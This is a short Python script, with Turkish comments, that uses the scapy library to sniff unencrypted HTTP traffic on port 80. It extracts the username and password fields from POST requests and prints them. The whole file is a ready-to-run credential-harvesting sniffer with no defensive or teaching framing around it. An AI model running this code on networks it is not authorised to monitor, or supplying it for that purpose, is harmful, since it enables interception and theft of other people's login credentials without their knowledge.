from scapy.all import *

def packet_handler(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode('utf-8')
            if "POST" in payload and "username=" in payload:
                payload = payload.split("\r\n\r\n")[1]  # İçeriği ayırma
                params = payload.split("&")  # Parametreleri ayırma
                username = ""
                password = ""
                for param in params:
                    if param.startswith("username="):
                        username = param.split("=")[1]
                    elif param.startswith("password="):
                        password = param.split("=")[1]
                print("Username:", username)
                print("Password:", password)
                print("---------------")
        except UnicodeDecodeError:
            pass

sniff(filter="tcp port 80", prn=packet_handler)
